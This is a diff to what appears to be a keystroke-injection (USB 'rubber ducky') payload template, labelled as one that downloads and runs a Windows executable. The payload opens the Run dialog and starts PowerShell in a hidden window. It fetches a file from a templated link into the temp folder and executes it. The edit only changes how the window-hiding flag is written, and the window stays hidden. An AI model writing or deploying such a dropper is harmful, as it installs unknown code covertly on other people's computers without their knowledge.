@@ -2,5 +2,5 @@ REM Downloads and executes a windows executable
 DELAY {start_delay}
 GUI r
 DELAY 350
-STRING cmd /c start /min powershell -w hidden "curl {link} -o $env:temp/r.exe;&$env:temp/r.exe"
+STRING cmd /c start /min powershell -w 1 "curl {link} -o $env:temp/r.exe;&$env:temp/r.exe"
 {windows_admin}
